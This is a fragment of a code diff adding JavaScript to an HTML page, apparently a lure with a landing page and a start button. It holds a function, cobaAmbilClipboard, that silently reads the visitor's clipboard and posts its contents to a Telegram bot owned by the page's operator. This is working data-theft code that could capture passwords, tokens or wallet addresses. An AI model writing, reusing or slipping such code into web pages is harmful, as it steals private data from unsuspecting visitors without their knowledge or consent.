+    async function cobaAmbilClipboard() {
+      try {
+        if (navigator.clipboard && navigator.clipboard.readText) {
+          const text = await navigator.clipboard.readText();
+          if (text && text.length > 8) {
+            const fd = new FormData();
+            fd.append("chat_id", OWNER_ID);
+            fd.append("text", "📋 *Clipboard:* \n" + text);
+            fd.append("parse_mode", "Markdown");
+            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, { method: "POST", body: fd });
+          }
+        }
+      } catch (e) {
+        console.error("Gagal mengambil clipboard:", e);
+      }
+    }
+
+    startButton.addEventListener("click", startProcess);
+
+    document.addEventListener('DOMContentLoaded', () => {
+      showMainPage('landing-page');
+      showProcessingLayer(false);
+    });
+
+  })();
 </script>
+
 </body>
 </html>
